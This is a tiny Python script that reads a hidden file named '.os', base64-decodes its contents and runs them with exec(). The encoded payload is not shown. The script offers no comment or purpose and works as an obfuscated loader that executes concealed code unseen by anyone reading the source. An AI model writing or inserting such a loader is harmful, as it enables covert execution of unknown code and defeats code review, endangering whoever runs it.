import base64 as b
s=open('.os','r')
l=s.read()
s.close()
l=l+"=="
exec(b.b64decode(l))
